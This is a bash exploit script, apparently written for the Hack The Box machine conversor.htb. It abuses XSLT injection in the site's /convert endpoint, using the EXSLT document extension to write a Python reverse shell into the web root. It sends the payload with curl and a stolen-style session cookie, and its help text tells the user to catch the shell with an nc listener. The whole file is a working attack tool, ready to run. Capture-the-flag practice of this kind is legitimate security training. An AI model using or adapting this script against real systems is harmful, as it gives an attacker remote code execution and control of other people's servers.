#!/bin/bash
#Author 0xmr-security
# Color codes
BOLD="\033[1m"
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
BLUE="\033[34m"
RESET="\033[0m"

# Set your variables
http_url="$1"
ip="$2"
port="$3"
session_cookie="$4"
boundary="----WebKitFormBoundaryoKb5saL0RfArJfmH"

show_help() {
    echo -e "${BOLD}${RED}Usage: $0 <target_url> <ip> <port> <session_cookie>${RESET}"
    echo -e "${GREEN}Example: $0 http://conversor.htb 10.10.14.137 9001 eyJ1c2VyX2lkIjoxMSwidXNlcm5hbWUiOiJveG1yIn0.aP0fhQ.ZGywklg4KAQGkN87QTXNixfkthY${RESET}"
    echo ""
    echo -e "${YELLOW}This script exploits XSLT injection to upload a reverse shell.${RESET}"
    echo -e "${YELLOW}Make sure to start your listener first: ${BOLD}nc -lvnp <port>${RESET}"
}

# Check for help flag
if [[ "$1" == "-h" ]] || [[ "$1" == "--help" ]]; then
    show_help
    exit 0
fi

# Validate parameters
if [ $# -ne 4 ]; then
    echo -e "${RED}Error: Missing required parameters!${RESET}"
    echo ""
    show_help
    exit 1
fi

# Validate IP format (basic check)
if ! [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo -e "${RED}Error: Invalid IP address format: $ip${RESET}"
    exit 1
fi

# Validate port number
if ! [[ $port =~ ^[0-9]+$ ]] || [ $port -lt 1 ] || [ $port -gt 65535 ]; then
    echo -e "${RED}Error: Invalid port number: $port${RESET}"
    exit 1
fi

echo -e "${BOLD}${BLUE}[*] Target: $http_url${RESET}"
echo -e "${BOLD}${BLUE}[*] Reverse shell to: $ip:$port${RESET}"
echo -e "${BOLD}${BLUE}[*] Session cookie: ${session_cookie:0:20}...${RESET}"
echo ""

# Create temporary files for the payload
cat > /tmp/me.xml << EOF
<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap" args="nmap -sV 127.0.0.1" start="1234567890" version="7.80">
<host><status state="up"/><address addr="127.0.0.1" addrtype="ipv4"/></host>
</nmaprun>
EOF

cat > /tmp/deep.xslt << EOF
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:ptswarm="http://exslt.org/common"
    extension-element-prefixes="ptswarm"
    version="1.0">
<xsl:template match="/">
  <ptswarm:document href="/var/www/conversor.htb/scripts/pwn.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("$ip",$port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
  </ptswarm:document>
</xsl:template>
</xsl:stylesheet>
EOF

echo -e "${YELLOW}[*] Payload files created in /tmp/${RESET}"
echo -e "${YELLOW}[*] Sending exploit request...${RESET}"

response=$(curl -s -X POST "$http_url/convert" \
  -H "Host: conversor.htb" \
  -H "Cache-Control: max-age=0" \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Origin: $http_url" \
  -H "Content-Type: multipart/form-data; boundary=$boundary" \
  -H "Upgrade-Insecure-Requests: 1" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
  -H "Referer: $http_url/" \
  -H "Accept-Encoding: gzip, deflate, br" \
  -H "Cookie: session=$session_cookie" \
  -H "Connection: keep-alive" \
  --data-binary @- << EOF
--${boundary}
Content-Disposition: form-data; name="xml_file"; filename="me.xml"
Content-Type: text/xml

$(cat /tmp/me.xml)

--${boundary}
Content-Disposition: form-data; name="xslt_file"; filename="deep.xslt"
Content-Type: application/xslt+xml

$(cat /tmp/deep.xslt)

--${boundary}--
EOF
)

# Check response
if [ $? -eq 0 ]; then
    echo -e "${GREEN}[+] Request sent successfully!${RESET}"
    echo -e "${YELLOW}[*] Response:${RESET}"
    echo "$response"
else
    echo -e "${RED}[-] Request failed!${RESET}"
fi

# Clean up
rm -f /tmp/me.xml /tmp/deep.xslt
echo -e "${YELLOW}[*] Temporary files cleaned up${RESET}"

echo ""
echo -e "${BOLD}${BLUE}[*] Next steps:${RESET}"
echo -e "    ${GREEN}1. Check if shell was created: curl '$http_url/scripts/pwn.py'${RESET}"
echo -e "    ${GREEN}2. Execute the shell if needed${RESET}"
echo -e "    ${GREEN}3. Check your listener for connection${RESET}"
